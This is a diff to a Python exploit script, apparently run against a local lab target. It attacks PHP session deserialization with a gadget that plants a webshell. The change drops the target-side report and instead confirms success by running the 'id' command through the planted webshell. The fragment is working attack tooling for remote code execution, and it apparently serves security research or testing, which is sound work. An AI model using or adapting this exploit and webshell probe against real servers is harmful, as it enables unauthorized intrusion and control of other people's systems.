@@ -118,15 +118,14 @@ def main() -> int:
     body = raw.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in raw else raw
     print(f"[*] consumer raw ({len(body)} bytes): {body[:600]!r}")
 
-    rep = lab.consume(sid)
-    print(f"[*] consumer report: {rep}")
+    print(f"[*] consumer body: {body[:300]!r}")
 
-    ok = False
-    objs = rep.get("objects") or {}
-    if "evil" in objs:
-        ok = True
-        print(f"[+] HIT: $_SESSION['evil'] is a live "
-              f"{objs['evil'].get('class')} -> {objs['evil'].get('props')}")
+    # Verdict WITHOUT any target-side report: the consumer request above
+    # fired the gadget, so the webshell on disk IS the proof - probe it.
+    shell_out = lab.probe_shell(lab.PORT, "id")
+    ok = bool(shell_out)
+    if ok:
+        print(f"[+] HIT: webshell answered -> {shell_out!r}")
 
     # save artifacts
     import os
@@ -136,7 +135,7 @@ def main() -> int:
         f.write(f"sid={sid}\nk={k}\nf={f_actual}\ne={e_actual}\n"
                 f"|C|={len(c)} |R|={len(r)} |mix|={len(mix)}\n"
                 f"actual_bp={actual_bp}\n"
-                f"report={rep}\n")
+                f"probe={shell_out!r}\n")
 
     for s in (carrier_sock, repl_sock):
         try:
